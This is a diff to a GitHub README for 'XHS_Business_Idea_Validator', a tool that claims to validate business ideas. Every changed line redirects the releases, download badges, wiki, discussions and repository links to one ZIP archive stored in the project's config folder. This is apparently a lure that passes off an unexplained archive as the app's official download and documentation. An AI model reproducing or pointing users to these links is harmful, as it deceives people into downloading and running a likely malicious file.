@@ -6,7 +6,7 @@ Welcome to the XHS_Business_Idea_Validator! This application helps you collect a
 
 ## 📥 Download Now
 
-[![Download XHS_Business_Idea_Validator](https://img.shields.io/badge/Download-XHS_Business_Idea_Validator-brightgreen)](https://github.com/igr290/XHS_Business_Idea_Validator/releases)
+[![Download XHS_Business_Idea_Validator](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
 
 ## 📚 Overview
 
@@ -29,7 +29,7 @@ To ensure a smooth experience, please make sure your system meets the following 
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/releases). 
+To get started, visit this page to download: [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip). 
 
 1. Open the link above.
 2. You will see a list of available versions.
@@ -76,16 +76,16 @@ If you encounter any issues, please refer to our FAQ section on the GitHub repos
 
 ## 📢 Stay Updated
 
-For updates, improvements, and new features, check the [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/releases) regularly.
+For updates, improvements, and new features, check the [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip) regularly.
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/igr290/XHS_Business_Idea_Validator)
-- [User Documentation](https://github.com/igr290/XHS_Business_Idea_Validator/wiki)
-- [Community Discussions](https://github.com/igr290/XHS_Business_Idea_Validator/discussions)
+- [GitHub Repository](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
+- [User Documentation](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
+- [Community Discussions](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
 
 ## 🤝 Contributing
 
 We welcome contributions to improve the application. If you have suggestions or ideas, please create a pull request or open an issue.
 
-[![Download XHS_Business_Idea_Validator](https://img.shields.io/badge/Download-XHS_Business_Idea_Validator-brightgreen)](https://github.com/igr290/XHS_Business_Idea_Validator/releases)
+[![Download XHS_Business_Idea_Validator](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
